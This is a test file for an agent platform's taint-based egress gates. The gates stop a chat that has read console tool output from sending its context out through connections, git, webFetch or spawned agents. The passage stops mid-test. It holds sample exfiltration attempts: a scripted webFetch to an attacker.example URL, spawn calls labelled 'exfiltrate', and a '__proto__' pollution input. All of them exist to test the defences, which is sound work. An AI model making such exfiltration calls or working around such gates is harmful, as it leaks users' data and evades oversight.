// Sticky chat taint and its egress gates (callable-widget contract §4.8.4-§4.8.5, §4.8.9). Once a
// chat carries the console tool taint mark, nothing its agent controls may carry its context out:
//   - gate 1: executeCode's env holds only first-party (allowlisted) connections: no gadget,
//     worktree or env.GIT;
//   - gate 2: an agent session to any other connection, a gadget, a worktree or git is refused
//     before it opens, and [restore] forging is refused;
//   - Measure B: stubs delivered into the chat (callback arguments) reach its env as data only;
//   - describeBinding, requestConnection and webFetch refuse.
// Nothing writes the mark yet (the console tools will), so these tests set it directly in storage.
//
// Each test runs against the real OverseerImpl in workerd. The "interceptor" records every way a
// request could leave: a gatekeeper facet reached, a gatekeeper session opened, a git session
// opened, and any fetch() from the Overseer's isolate. The executeCode env's loopbacks are the real
// ones, so a call on a stub in loaded code reaches startGatekeeperSession exactly as in production
// (see GatekeeperLoopback.prototype.ping below), then fails on the recorded session, which has
// no methods.

import { afterAll, afterEach, describe, expect, it, vi } from "vitest";
import { env, RpcStub as NativeRpcStub, RpcTarget as NativeRpcTarget } from "cloudflare:workers";
import { runInDurableObject } from "cloudflare:test";
import {
  createFauxCore, fauxAssistantMessage, fauxText, fauxToolCall, type Context, type TranscriptContext,
} from "@earendil-works/pi-ai";
import { keyString } from "@gadgets/typed-storage";
import type { AiChatAuthorInfo, Overseer } from "@gadgets/workshop-shared/api";
import { diffFiles, type CodeContent, type CodeChange } from "@gadgets/workshop-shared/code-change";
import { GatekeeperLoopback, type OverseerDurableObject } from "../src/overseer.js";
import { runAgent } from "../src/agent";
import {
  dropStubsIfTainted, isConsoleToolTainted, markConsoleToolTainted, STUB_WALK_MAX_DEPTH,
  TAINTED_CHAT_VENDOR_IDS, usableWhileTainted,
} from "../src/chat-taint";

declare module "cloudflare:workers" {
  interface ProvidedEnv {
    TEST_OVERSEER: DurableObjectNamespace<OverseerDurableObject>;
  }
}

const ALICE: AiChatAuthorInfo = { type: "user", id: "alice@example.com", name: "Alice" };
const A = 1;  // the chat that gets tainted
const B = 2;  // an untainted chat

// Connections, by vendor. Only the first three are allowlisted.
const BOARD = 10, CONTEXT = 11, SCHEDULER = 12, SLACK = 13, MCP = 14, SPAWNER = 15, LEGACY = 16;
const BINDINGS = {
  BOARD: { type: "workpiece", id: BOARD },
  LIBRARY: { type: "workpiece", id: CONTEXT },
  TASKS: { type: "workpiece", id: SCHEDULER },
  SLACK: { type: "workpiece", id: SLACK },
  MCP: { type: "workpiece", id: MCP },
  AGENT_SPAWNER: { type: "workpiece", id: SPAWNER },
  OLD: { type: "workpiece", id: LEGACY },
} as const;
const ALLOWED = ["BOARD", "LIBRARY", "TASKS"];

// A gadget and one of chat A's worktrees, bound beside the connections where a test adds them.
const GADGET = 20, TREE = 21;
const WITH_WORKPIECES = {
  ...BINDINGS,
  WIDGET: { type: "workpiece", id: GADGET },
  TREE: { type: "workpiece", id: TREE },
} as const;

function addWorkpieces(impl: any): void {
  impl.storage.gadgets.put({ type: "gadget", id: GADGET, title: "Widget", created: new Date(0),
    bindingName: "WIDGET", bindings: {} });
  let commit = "0".repeat(40);
  impl.storage.gadgets.put({ type: "worktree", id: TREE, title: "Tree", chatId: A,
    baseCommit: commit, headCommit: commit, pinBase: commit });
}

function connection(id: number, vendorId: string) {
  // An empty resource URL matches no operate-excluded type (see #excludedFromOperateChat).
  return { id, resourceTitle: vendorId, class: {} as any,
    creationSpec: { type: "gatekeeper", vendorId, resourceUrl: "", typeUrlPattern: "" } };
}

function seed(impl: any, operate: boolean): void {
  impl.ownerId = "owner-user-do";
  impl.users = {
    idFromString: (id: string) => id,
    idFromName: (name: string) => name,
    newUniqueId: () => "unique",
    get: () => ({
      whoami: async () => ({ type: "user", id: "owner", name: "Owner" }),
      listGatekeeperVendors: async () => [{
        id: "slack", description: { displayName: "Slack" },
        supportedResources: [{ title: "Slack workspace", urlPattern: "slack://*" }],
      }],
    }),
  };
  impl.storage.title.put("Workspace");
  if (operate) impl.storage.operateSession.put(true);
  for (let id of [A, B]) {
    impl.storage.chatMeta.put({ id, title: `Chat ${id}`, started: new Date(0), lastActive: new Date(id) });
  }
  impl.storage.gatekeepers.put(connection(BOARD, "inferops"));
  impl.storage.gatekeepers.put(connection(CONTEXT, "context"));
  impl.storage.gatekeepers.put(connection(SCHEDULER, "scheduler"));
  impl.storage.gatekeepers.put(connection(SLACK, "slack"));
  impl.storage.gatekeepers.put(connection(MCP, "mcp"));
  impl.storage.gatekeepers.put({ id: SPAWNER, resourceTitle: "Drafter", class: {} as any,
    creationSpec: { type: "agentSpawner", config: { displayName: "Drafter", modelId: "m", env: {} } } });
  impl.storage.gatekeepers.put({ id: LEGACY, resourceTitle: "Legacy", class: {} as any });
}

// Every way a request could leave the Workshop, recorded rather than performed.
function intercept(impl: any): string[] {
  let sent: string[] = [];
  impl.getGadgetFacet = async (id: number) => {
    sent.push(`gadget:${id}`);
    return {};
  };
  impl.getGatekeeperFacet = (id: number) => {
    sent.push(`facet:${id}`);
    return { gitPull: async () => { sent.push("gitPull"); return []; } };
  };
  impl.openGatekeeperSession = async (id: number) => {
    sent.push(`session:${id}`);
    return { session: id };
  };
  let start = impl.startGatekeeperSession;
  impl.startGatekeeperSession = (target: any, caller: any) => {
    let opened = start.call(impl, target, caller);
    if (target.type === "git") void opened.then(() => sent.push("git"), () => {});
    return opened;
  };
  vi.stubGlobal("fetch", async (input: RequestInfo | URL) => {
    sent.push(`fetch:${input instanceof Request ? input.url : String(input)}`);
    throw new Error("The test network refuses every request.");
  });
  return sent;
}

// In production a call on a binding loopback is pipelined onto the session its constructor opens,
// so the call -- and the execution making it -- waits for that open. This pool's entrypoint wrapper
// serves only methods on the entrypoint's prototype, and GatekeeperLoopback serves its methods from
// the Proxy it returns instead, so the wrapper refuses the call at once. Nothing then waits for the
// open: the request the constructor sent can land after the execution has ended, when an operate
// workspace refuses it as no longer live, or be cancelled with the refused call. Declaring the
// method the loaded code calls on the prototype, forwarding to the Proxy, restores the production
// path.
Object.defineProperty(GatekeeperLoopback.prototype, "ping", {
  configurable: true,
  value(this: Record<string, (...args: unknown[]) => unknown>, ...args: unknown[]) {
    return this.ping(...args);
  },
});
afterAll(() => { delete (GatekeeperLoopback.prototype as any).ping; });

afterEach(() => { vi.unstubAllGlobals(); });

let doCounter = 0;
async function withImpl(operate: boolean, fn: (impl: any, instance: any) => Promise<void>)
    : Promise<void> {
  let stub = env.TEST_OVERSEER.getByName(`chat-taint-${++doCounter}`);
  await runInDurableObject(stub, async (instance: OverseerDurableObject) => {
    let impl = (instance as unknown as { impl: any }).impl;
    seed(impl, operate);
    await fn(impl, instance);
  });
}

type Minted = { stub: unknown, target: any, caller: any };

// Starts an executeCode run of `code` in `chatId`, resolving the env it was built with. Every
// loopback minted for it is real; their props are kept beside them, so a test can replay one through
// startGatekeeperSession exactly as the loopback would.
function startExecution(impl: any, chatId: number, code: string, bindings: object = BINDINGS)
    : { env: Promise<Record<string, any>>, minted: Map<unknown, Minted>, done: Promise<string> } {
  let minted = new Map<unknown, Minted>();
  let makeBindingLoopback = impl.makeBindingLoopback;
  impl.makeBindingLoopback = (target: any, caller: any) => {
    let stub = makeBindingLoopback.call(impl, target, caller);
    minted.set(stub, { stub, target, caller });
    return stub;
  };
  let resolveEnv!: (built: Record<string, any>) => void;
  let envPromise = new Promise<Record<string, any>>(resolve => { resolveEnv = resolve; });
  let getEnvForAgent = impl.getEnvForAgent;
  impl.getEnvForAgent = (...args: unknown[]) => {
    impl.getEnvForAgent = getEnvForAgent;
    let built = getEnvForAgent.apply(impl, args);
    impl.makeBindingLoopback = makeBindingLoopback;
    resolveEnv(built);
    return built;
  };
  let done = impl.executeCodeMode(chatId, code, ALICE, "some-model", bindings);
  return { env: envPromise, minted, done };
}

// Loaded code that reports its env's names and calls a method on every stub it holds -- directly,
// or inside the callback arguments under `ARGS` -- which is what would send a request.
const TOUCH_EVERYTHING = `
  export default async function(self, env) {
    let poke = async v => { try { await v.ping(); } catch {} };
    for (let [name, value] of Object.entries(env)) {
      if (Array.isArray(value)) for (let item of value) await poke(item);
      else await poke(value);
    }
    console.log(JSON.stringify(Object.keys(env).toSorted()));
    console.log(JSON.stringify(env.ARGS?.map(v => v === undefined ? null : typeof v) ?? null));
  }`;

const TOUCH_WIDGET = `
  export default async function(self, env) { try { await env.WIDGET.ping(); } catch {} }`;

const wait = (ms: number) => `export default async function() { await new Promise(r => setTimeout(r, ${ms})); }`;

// The callback arguments `args` delivered into `chatId` as the drain records them, and the binding
// that hands them to the chat's next executeCode.
function deliverArgs(impl: any, chatId: number, args: unknown[]): object {
  let sequence = impl.nextChatSequence(chatId);
  impl.storage.agentCallbackArgs.put({ chatId, sequence, args });
  return { ARGS: { type: "value", messageSequence: sequence } };
}

// A taint row written directly. markConsoleToolTainted refuses outside an operate workspace, but the
// gates read the row wherever it is, so the Build-workspace tests below check them that way.
function writeTaintRow(impl: any, chatId: number): void {
  impl.storage.consoleToolTaints.put({ chatId, markedAt: new Date() });
}

const TAINT_REFUSAL = /read console tool output/;
const NOT_LIVE = /no longer live/;

describe("the mark", () => {
  it("is refused outside an operate workspace, leaving the chat unmarked", () => withImpl(false, async impl => {
    expect(() => markConsoleToolTainted(impl.storage, A)).toThrow(/only be read in an operate workspace/);
    expect(isConsoleToolTainted(impl.storage, A)).toBe(false);
    expect(impl.storage.consoleToolTaints.get(A)).toBeUndefined();
  }));

  it("is its own row, set once, keyed by chat", () => withImpl(true, async impl => {
    expect(isConsoleToolTainted(impl.storage, A)).toBe(false);
    markConsoleToolTainted(impl.storage, A);
    let first = impl.storage.consoleToolTaints.get(A).markedAt;
    markConsoleToolTainted(impl.storage, A);
    expect(impl.storage.consoleToolTaints.get(A).markedAt).toEqual(first);
    expect(isConsoleToolTainted(impl.storage, A)).toBe(true);
    expect(isConsoleToolTainted(impl.storage, B)).toBe(false);
    expect(impl.storage.chatMeta.get(A)).not.toHaveProperty("consoleToolTainted");
  }));

  it("allowlists exactly inferops, context and scheduler, and refuses a missing vendor id", () => {
    expect([...TAINTED_CHAT_VENDOR_IDS].toSorted()).toEqual(["context", "inferops", "scheduler"]);
    for (let vendor of ["inferops", "context", "scheduler"]) expect(usableWhileTainted(vendor)).toBe(true);
    for (let vendor of ["slack", "mcp", "gatekeeper-inferops", "INFEROPS", undefined]) {
      expect(usableWhileTainted(vendor)).toBe(false);
    }
  });
});

describe("dropStubsIfTainted (Measure B's walk)", () => {
  it("removes every capability, including restored loopbacks, and keeps the data",
      () => withImpl(true, async impl => {
    // Stored loopbacks come back from storage as service stubs (Fetcher), not RpcStub instances.
    let loopback = impl.makeBindingLoopback({ type: "git" }, { from: "agent", chatId: B });
    let self = impl.ctx.exports.AgentSelfLoopback({ props: {
      overseerId: impl.ctx.id.toString(), chatId: B, initiatorUserId: "u", initiatorModelId: "m" } });
    impl.storage.agentCallbackArgs.put({ chatId: A, sequence: 99, args: [loopback, self] });
    let [restoredLoopback, restoredSelf] =
        impl.storage.agentCallbackArgs.get(`${keyString(A)}.${keyString(99)}`).args;

    let date = new Date(5);
    let bytes = new Uint8Array([1, 2]);
    let args = [
      "text", 3, null, undefined, true, date, bytes,
      restoredLoopback, restoredSelf, new NativeRpcStub(new NativeRpcTarget()), new NativeRpcTarget(),
      () => 1, new Map([["k", 1]]),
      { keep: { n: 1, list: [1, restoredLoopback] }, stub: restoredSelf, fn: () => 1 },
    ];

    expect(dropStubsIfTainted(args, true)).toEqual([
      "text", 3, null, undefined, true, date, bytes,
      undefined, undefined, undefined, undefined, undefined, undefined,
      { keep: { n: 1, list: [1, undefined] } },
    ]);
    // Unmarked, the value is returned untouched.
    expect(dropStubsIfTainted(args, false)).toBe(args);
  }));

  it("drops a self-cycle's back edge and keeps the rest", () => {
    let node: any = { n: 1 };
    node.self = node;
    let list: any[] = [1];
    list.push(list);
    expect(dropStubsIfTainted([node, list], true)).toEqual([{ n: 1 }, [1, undefined]]);
  });

  it("drops a mutual cycle's back edge and walks each object once", () => {
    let a: any = { name: "a" };
    let b: any = { name: "b", a };
    a.b = b;
    // Walked through `a` first, `b` loses its edge back to `a`; reached again as `root.b`, it is not
    // walked again, so it stays without it.
    expect(dropStubsIfTainted({ a, b }, true)).toEqual({ a: { name: "a", b: { name: "b" } }, b: { name: "b" } });

    // Shared references cannot make the walk exponential: 2^200 paths, 200 objects.
    let shared: any = { leaf: true };
    for (let i = 0; i < 200; i++) shared = [shared, shared];
    expect(() => dropStubsIfTainted(shared, true)).not.toThrow();
  });

  it("drops everything below the depth cap, without exhausting the stack", () => {
    let deep: any = { leaf: new NativeRpcStub(new NativeRpcTarget()) };
    for (let i = 0; i < 100; i++) deep = { next: deep };
    let walked: any = dropStubsIfTainted(deep, true);
    let levels = 0;
    for (let node = walked; node.next !== undefined; node = node.next) levels++;
    expect(levels).toBe(STUB_WALK_MAX_DEPTH - 1);

    let veryDeep: any = [];
    for (let i = 0; i < 200_000; i++) veryDeep = [veryDeep];
    expect(() => dropStubsIfTainted(veryDeep, true)).not.toThrow();
  });

  it("copies an own __proto__ key as data, never as the prototype", () => {
    let hostile = JSON.parse('{"__proto__": {"polluted": true}, "ok": 1}');
    let [walked] = dropStubsIfTainted([hostile], true) as any[];
    expect(Object.getPrototypeOf(walked)).toBe(Object.prototype);
    expect(walked.polluted).toBeUndefined();
    expect(Object.hasOwn(walked, "__proto__")).toBe(true);
    expect(Object.getOwnPropertyDescriptor(walked, "__proto__")!.value).toEqual({ polluted: true });
    expect(walked.ok).toBe(1);
  });

  it("lets a chat with a stored cyclic value keep running executeCode", () => withImpl(true, async impl => {
    intercept(impl);
    let cyclic: any = { n: 1 };
    cyclic.self = cyclic;
    let args = deliverArgs(impl, A, [cyclic]);
    markConsoleToolTainted(impl.storage, A);
    for (let attempt = 0; attempt < 2; attempt++) {
      let run = startExecution(impl, A, wait(0), { ...BINDINGS, ...args });
      expect((await run.env).ARGS).toEqual([{ n: 1 }]);
      await run.done;
    }
  }));
});

describe("gate 1: a tainted chat's executeCode env", () => {
  it("holds only allowlisted connections and no GIT, and nothing is sent",
      () => withImpl(true, async impl => {
    let sent = intercept(impl);
    markConsoleToolTainted(impl.storage, A);
    let run = startExecution(impl, A, TOUCH_EVERYTHING);
    let built = await run.env;
    let out = await run.done;

    expect(Object.keys(built).toSorted()).toEqual([...ALLOWED].toSorted());
    expect(out).toContain(JSON.stringify([...ALLOWED].toSorted()));
    // Only the allowlisted connections were reached; the vendor-less spawner and legacy record,
    // Slack, MCP and git never were.
    expect([...new Set(sent)].toSorted()).toEqual(
        [BOARD, CONTEXT, SCHEDULER].flatMap(id => [`facet:${id}`, `session:${id}`]).toSorted());
  }));

  it("is unchanged when the chat is not marked", () => withImpl(true, async impl => {
    let sent = intercept(impl);
    markConsoleToolTainted(impl.storage, B);  // another chat's mark does not apply
    let run = startExecution(impl, A, TOUCH_EVERYTHING);
    let built = await run.env;
    await run.done;

    expect(Object.keys(built).toSorted()).toEqual([...Object.keys(BINDINGS), "GIT"].toSorted());
    for (let id of [BOARD, CONTEXT, SCHEDULER, SLACK, MCP, SPAWNER, LEGACY]) {
      expect(sent).toContain(`session:${id}`);
    }
    expect(sent).toContain("git");
  }));

  it("holds no gadget or worktree binding, and no gadget is reached",
      () => withImpl(true, async impl => {
    let sent = intercept(impl);
    addWorkpieces(impl);
    markConsoleToolTainted(impl.storage, A);
    let run = startExecution(impl, A, TOUCH_EVERYTHING, WITH_WORKPIECES);
    expect(Object.keys(await run.env).toSorted()).toEqual([...ALLOWED].toSorted());
    await run.done;
    expect(sent.filter(entry => entry.startsWith("gadget:"))).toEqual([]);

    // Unmarked, chat B gets both, and reaches the gadget. It touches only the gadget: TREE is chat
    // A's worktree, so B's session to it is refused, and that refusal goes unhandled in the loopback.
    let control = startExecution(impl, B, TOUCH_WIDGET, WITH_WORKPIECES);
    expect(Object.keys(await control.env)).toEqual(expect.arrayContaining(["WIDGET", "TREE"]));
    await control.done;
    expect(sent).toContain(`gadget:${GADGET}`);
  }));

  it("applies in a Build workspace too", () => withImpl(false, async impl => {
    let sent = intercept(impl);
    writeTaintRow(impl, A);
    let run = startExecution(impl, A, TOUCH_EVERYTHING);
    expect(Object.keys(await run.env).toSorted()).toEqual([...ALLOWED].toSorted());
    await run.done;
    expect(sent.filter(entry => /:(13|14|15|16)$|^git$/.test(entry))).toEqual([]);
  }));
});

describe("gate 2: a tainted chat's agent sessions", () => {
  it("refuses every non-allowlisted connection and git before anything opens",
      () => withImpl(true, async impl => {
    let sent = intercept(impl);
    // Stubs minted inside a live execution of A, before the mark: Measure A alone would admit them.
    let run = startExecution(impl, A, wait(500));
    let built = await run.env;
    markConsoleToolTainted(impl.storage, A);
    let open = (name: string) => {
      let { target, caller } = run.minted.get(built[name])!;
      return impl.startGatekeeperSession(target, caller);
    };

    for (let name of ["SLACK", "MCP", "AGENT_SPAWNER", "OLD", "GIT"]) {
      expect(() => open(name)).toThrow(TAINT_REFUSAL);
    }
    expect(sent).toEqual([]);

    // The allowlisted connections still open.
    for (let name of ALLOWED) await open(name);
    expect(sent).toEqual([BOARD, CONTEXT, SCHEDULER].flatMap(id => [`facet:${id}`, `session:${id}`]));
    await run.done;
  }));

  it("refuses gadget and worktree sessions and [restore] forging, whenever the mark lands",
      () => withImpl(true, async impl => {
    let sent = intercept(impl);
    addWorkpieces(impl);
    // Minted inside a live execution of A, before the mark.
    let run = startExecution(impl, A, wait(500), WITH_WORKPIECES);
    let built = await run.env;
    markConsoleToolTainted(impl.storage, A);
    for (let name of ["WIDGET", "TREE"]) {
      let { target, caller } = run.minted.get(built[name])!;
      expect(() => impl.startGatekeeperSession(target, caller)).toThrow(TAINT_REFUSAL);
    }
    await expect(impl.forgeRestoreStubForBinding(A, WITH_WORKPIECES, "WIDGET", {}))
        .rejects.toThrow(TAINT_REFUSAL);
    expect(sent).toEqual([]);

    // A gadget's own caller still reaches the gadget.
    await impl.startGatekeeperSession({ type: "gadget", id: GADGET }, { from: "gadget", gadgetId: 100 });
    expect(sent).toEqual([`gadget:${GADGET}`]);
    await run.done;
  }));

  it("leaves gadget callers and other chats alone", () => withImpl(true, async impl => {
    let sent = intercept(impl);
    markConsoleToolTainted(impl.storage, A);
    let gadget = { from: "gadget", gadgetId: 100 };
    await impl.startGatekeeperSession({ type: "gatekeeper", id: SLACK }, gadget);
    await impl.startGatekeeperSession({ type: "git" }, gadget);

    let run = startExecution(impl, B, wait(200));
    let built = await run.env;
    let { target, caller } = run.minted.get(built.SLACK)!;
    await impl.startGatekeeperSession(target, caller);
    expect(sent).toEqual([`facet:${SLACK}`, `session:${SLACK}`, "git", `facet:${SLACK}`, `session:${SLACK}`]);
    await run.done;
  }));
});

describe("Measure B: stubs delivered into a tainted chat", () => {
  it("drops stubs stored before the mark, keeps their data, and sends nothing",
      () => withImpl(true, async impl => {
    let sent = intercept(impl);
    // Before the mark, A's execution keeps env.SLACK and env.GIT through self.later(...).
    let first = startExecution(impl, A, wait(0));
    let kept = await first.env;
    await first.done;
    let args = deliverArgs(impl, A, [kept.SLACK, kept.GIT, "note", { count: 2 }]);
    markConsoleToolTainted(impl.storage, A);

    let second = startExecution(impl, A, TOUCH_EVERYTHING, { ...BINDINGS, ...args });
    let built = await second.env;
    let out = await second.done;
    expect(built.ARGS).toEqual([undefined, undefined, "note", { count: 2 }]);
    expect(out).toContain(JSON.stringify([null, null, "string", "object"]));
    expect(sent.filter(entry => /:(13|14|15|16)$|^git(Pull)?$/.test(entry))).toEqual([]);

    // Forced through anyway, each is refused before anything opens.
    for (let stub of [kept.SLACK, kept.GIT]) {
      let { target, caller } = first.minted.get(stub)!;
      expect(() => impl.startGatekeeperSession(target, caller)).toThrow(TAINT_REFUSAL);
    }
    expect(sent.filter(entry => /:(13|14|15|16)$|^git(Pull)?$/.test(entry))).toEqual([]);
  }));

  it("cross-chat: stubs minted in untainted B and delivered into tainted A never send",
      () => withImpl(true, async impl => {
    let sent = intercept(impl);
    let inB = startExecution(impl, B, wait(0));
    let fromB = await inB.env;
    await inB.done;
    // B's execution called aSelf.later(env.SLACK, env.GIT); the call lands in A.
    let args = deliverArgs(impl, A, [fromB.SLACK, fromB.GIT]);
    markConsoleToolTainted(impl.storage, A);

    let inA = startExecution(impl, A, TOUCH_EVERYTHING, { ...BINDINGS, ...args });
    let built = await inA.env;
    await inA.done;
    expect(built.ARGS).toEqual([undefined, undefined]);
    // Forced through, each is refused because its execution is not live (Measure A). B is
    // untainted, so this is not the taint check.
    for (let stub of [fromB.SLACK, fromB.GIT]) {
      let { target, caller } = inB.minted.get(stub)!;
      expect(() => impl.startGatekeeperSession(target, caller)).toThrow(NOT_LIVE);
    }
    expect(sent.filter(entry => /:(13|16)$|^git(Pull)?$/.test(entry))).toEqual([]);
  }));

  it("overlap: a live execution in B delivers env.SLACK and env.GIT into tainted A; A drops them",
      () => withImpl(true, async impl => {
    let sent = intercept(impl);
    // E_B stays live, awaiting, while its stubs are delivered into A.
    let eB = startExecution(impl, B, wait(1500));
    let fromB = await eB.env;
    let args = deliverArgs(impl, A, [fromB.SLACK, fromB.GIT]);
    markConsoleToolTainted(impl.storage, A);

    // A's execution runs during E_B.
    let inA = startExecution(impl, A, TOUCH_EVERYTHING, { ...BINDINGS, ...args });
    let built = await inA.env;
    let out = await inA.done;
    expect(sent.filter(entry => entry.endsWith(`:${SLACK}`) || /^git(Pull)?$/.test(entry)))
        .toEqual([]);
    expect(built.ARGS).toEqual([undefined, undefined]);
    expect(out).toContain(JSON.stringify([null, null]));

    // Why the walk is load-bearing: while E_B is live, its stubs pass Measure A, and gate 2 sees
    // B -- the minting chat -- which is untainted. Replayed under B's caller, Slack opens.
    let { target, caller } = eB.minted.get(fromB.SLACK)!;
    await impl.startGatekeeperSession(target, caller);
    expect(sent).toContain(`session:${SLACK}`);
    await eB.done;
  }));
});

describe("the cross-chat invariant", () => {
  it("leaves a tainted chat no channel to create or reach another chat", () =>
      withImpl(true, async (impl, instance) => {
    let sent = intercept(impl);
    // Every chat-creating or delivering entry point (see the static guard in chat-taint-guard).
    let reached: string[] = [];
    for (let name of ["newChat", "deliverAgentCallback"]) {
      let real = impl[name];
      impl[name] = (...args: unknown[]) => { reached.push(`${name}:${String(args[0])}`); return real.apply(impl, args); };
    }
    for (let name of ["spawnAgent", "spawnCallableAgent", "receiveExternalMessage"]) {
      let real = instance[name];
      instance[name] = (...args: unknown[]) => { reached.push(name); return real.apply(instance, args); };
    }
    let nextChatId = impl.nextChatId;
    impl.nextChatId = () => { reached.push("nextChatId"); return nextChatId.call(impl); };
    let chats = [...impl.storage.chatMeta.list()].length;

    // A holds B's `self` (delivered before the mark) and has the spawner bound.
    let bSelf = impl.ctx.exports.AgentSelfLoopback({ props: {
      overseerId: impl.ctx.id.toString(), chatId: B, initiatorUserId: "u", initiatorModelId: "m" } });
    let args = deliverArgs(impl, A, [bSelf]);
    markConsoleToolTainted(impl.storage, A);

    let run = startExecution(impl, A, `
      export default async function(self, env) {
        let tries = [
          () => env.AGENT_SPAWNER.spawn("t", "exfiltrate"),
          () => env.AGENT_SPAWNER.spawnCallable("t", {types: "", mainType: ""}),
          () => env.ARGS[0].later("exfiltrate"),
        ];
        for (let attempt of tries) { try { await attempt(); } catch {} }
        console.log(String(env.AGENT_SPAWNER), String(env.ARGS[0]));
      }`, { ...BINDINGS, ...args });
    let built = await run.env;
    let out = await run.done;

    expect(built).not.toHaveProperty("AGENT_SPAWNER");
    expect(built.ARGS).toEqual([undefined]);
    expect(out).toContain("undefined undefined");
    expect(reached).toEqual([]);
    expect(sent).not.toContain(`session:${SPAWNER}`);
    // Spawning created no chat.
    expect([...impl.storage.chatMeta.list()]).toHaveLength(chats);
  }));
});

describe("refusals", () => {
  it("describeBinding and describeGitBinding refuse while tainted, gadgets and worktrees included", () => withImpl(true, async impl => {
    impl.describeGatekeeper = async (name: string) => `${name} described`;
    addWorkpieces(impl);
    markConsoleToolTainted(impl.storage, A);
    await expect(impl.describeBinding(A, "env.WIDGET", GADGET)).rejects.toThrow(TAINT_REFUSAL);
    await expect(impl.describeBinding(A, "env.TREE", TREE)).rejects.toThrow(TAINT_REFUSAL);
    expect(await impl.describeBinding(B, "env.WIDGET", GADGET)).toContain("Binding: env.WIDGET");
    await expect(impl.describeBinding(A, "env.SLACK", SLACK)).rejects.toThrow(TAINT_REFUSAL);
    await expect(impl.describeBinding(A, "env.AGENT_SPAWNER", SPAWNER)).rejects.toThrow(TAINT_REFUSAL);
    expect(() => impl.describeGitBinding(A, "env.GIT")).toThrow(TAINT_REFUSAL);
    expect(await impl.describeBinding(A, "env.BOARD", BOARD)).toBe("env.BOARD described");
    // Unmarked chats are unchanged.
    expect(await impl.describeBinding(B, "env.SLACK", SLACK)).toBe("env.SLACK described");
    expect(impl.describeGitBinding(B, "env.GIT")).toContain("Binding: env.GIT");
  }));

  it("requestConnection refuses while tainted and creates no connection card",
      () => withImpl(true, async impl => {
    let input = { vendorId: "slack", resourceUrl: "slack://team", reason: "r", bindingName: "SLACK2" };
    markConsoleToolTainted(impl.storage, A);
    let refused = await impl.requestConnection(A, input);
    expect(refused).toEqual({ requested: false, message: expect.stringMatching(TAINT_REFUSAL) });
    expect(impl.consumeCapturedConnectionRequests(A)).toEqual([]);

    let requested = await impl.requestConnection(B, input);
    expect(requested.requested).toBe(true);
    expect(impl.consumeCapturedConnectionRequests(B)).toHaveLength(1);
  }));
});

// Workers clocks don't advance without I/O, and timestamps are indexed uniquely per chat.
let turns = 0;

// Runs one agent turn in chat A with pi's faux model answering each step in turn.
async function runScriptedTurn(impl: any, steps: ReturnType<typeof fauxAssistantMessage>[])
    : Promise<Context[]> {
  let faux = createFauxCore({ models: [{ id: "faux-model" }] });
  let contexts: Context[] = [];
  faux.setResponses(steps.map(step => (context: TranscriptContext) => {
    contexts.push({ messages: structuredClone(context.messages) });
    return step;
  }));
  impl.storage.chats.put({
    chatId: A, sequence: impl.nextChatSequence(A), timestamp: new Date(Date.now() + 60_000 * ++turns),
    author: ALICE, type: "message", message: "Fetch it.",
  });
  await runAgent(impl, { model: faux.getModel(), stream: faux.stream }, A,
      { type: "agent", id: "faux-model", name: "Faux" }, new AbortController().signal, ALICE,
      { provider: "cloudflare", model: "faux-model", apiToken: "" } as any);
  return contexts;
}

function toolResultTexts(context: Context): string[] {
  return context.messages.flatMap(message => message.role === "toolResult"
      ? [message.content.map(part => part.type === "text" ? part.text : "").join("")]
      : []);
}

// A turn whose model fetches an attacker URL, then stops.
const fetchTurn = (id: string) => [
  fauxAssistantMessage([fauxToolCall("webFetch", { url: `https://attacker.example/?d=${id}` })],
      { stopReason: "toolUse" }),
  fauxAssistantMessage(fauxText("Done.")),
];

describe("webFetch", () => {
  it("refuses while tainted, on every later turn and after compaction, with nothing fetched",
      () => withImpl(false, async impl => {
    let sent = intercept(impl);
    writeTaintRow(impl, A);

    let first = await runScriptedTurn(impl, fetchTurn("1"));
    expect(toolResultTexts(first[1]).at(-1)).toMatch(TAINT_REFUSAL);
    let second = await runScriptedTurn(impl, fetchTurn("2"));
    expect(toolResultTexts(second[1]).at(-1)).toMatch(TAINT_REFUSAL);

    impl.commitChatCompaction(A, { chatId: A, compactedTo: impl.nextChatSequence(A), summary: "s" });
    let third = await runScriptedTurn(impl, fetchTurn("3"));
    expect(toolResultTexts(third[1]).at(-1)).toMatch(TAINT_REFUSAL);
    expect(sent.filter(entry => entry.includes("attacker.example"))).toEqual([]);
  }));
});

describe("file tools", () => {
  // The git cache's fault pull (#pullGitObjects) reaches a connection's gitPull, which the gates do
  // not see. In an operate workspace the agent's only file tools are readFile and grep, it can
  // create no worktree, and a gadget there (a blueprint install) has only local content, so they
  // read without pulling. (In Build, the file tools and createWorktree can pull; Build chats are
  // never marked.)
  it("readFile and grep in a tainted operate chat reach no gitPull", () => withImpl(true, async impl => {
    let sent = intercept(impl);
    let c1 = await commitFiles(impl, { "a.txt": "one\n" });
    impl.storage.gadgets.put({ type: "gadget", id: 100, title: "App", created: new Date(0),
      bindingName: "APP", bindings: {}, commitId: c1 });
    // An object Slack advertised, which nothing local references.
    let advertised = "1".repeat(40);
    impl.storage.gitObjectMetadata.put({ oid: advertised, type: "blob", onRemote: [],
      pullableFrom: [SLACK], pendingPush: [] });
    markConsoleToolTainted(impl.storage, A);

    let contexts = await runScriptedTurn(impl, [
      fauxAssistantMessage([
        fauxToolCall("readFile", { workpiece: "APP", filename: "a.txt" }),
        fauxToolCall("grep", { workpiece: "APP", pattern: "one" }),
      ], { stopReason: "toolUse" }),
      fauxAssistantMessage(fauxText("Done.")),
    ]);
    let results = toolResultTexts(contexts[1]);
    expect(results).toEqual(["one\n", "a.txt:1:one"]);
    expect(sent.filter(entry => entry === "gitPull" || entry.startsWith("facet:"))).toEqual([]);

    // The interceptor does see a fault pull when one happens.
    await impl.gitCache.ensureGitObjects([advertised], { type: "blob" }).catch(() => {});
    expect(sent).toContain("gitPull");
  }));
});

// The chat-changes harness, cut down: a gadget with a committed file the chat edits.
async function commitFiles(impl: any, files: Record<string, string>, parents: string[] = []) {
  return await impl.gitStore.writeFilesAsCommit(new Map(Object.entries(files)), {
    parents, author: { name: "Alice", email: "alice@example.com" }, message: "test commit",
    timestamp: new Date(1700000000_000),
  });
}

function editChange(gadgetId: number, before: Record<string, string>, after: Record<string, string>)
    : CodeChange {
  let content = (files: Record<string, string>): CodeContent =>
      new Map([[gadgetId, new Map(Object.entries(files))]]);
  return diffFiles(content(before), content(after));
}

describe("the mark survives chatMeta rewrites", () => {
  it("through mergeChanges, updateChatFromMainline, revertChanges and compaction",
      () => withImpl(false, async impl => {
    let c1 = await commitFiles(impl, { "a.txt": "one\n" });
